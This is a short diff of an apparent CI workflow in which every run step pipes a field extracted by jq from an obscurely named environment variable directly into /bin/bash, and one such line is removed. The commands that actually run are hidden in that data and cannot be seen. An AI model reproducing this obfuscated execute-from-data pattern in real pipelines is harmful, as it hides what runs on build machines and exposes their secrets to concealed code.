@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$alua7496" | jq -r .vm665 | /bin/bash
           printf '%s' "$tk4637" | jq -r .gc92932 | /bin/bash
-          echo $f4 | jq -r .o91912 | /bin/bash
           echo $fxys56160 | jq -r .pako4824 | /bin/bash
           printf '%s' "$y75" | jq -r .cmpd48574 | /bin/bash
 
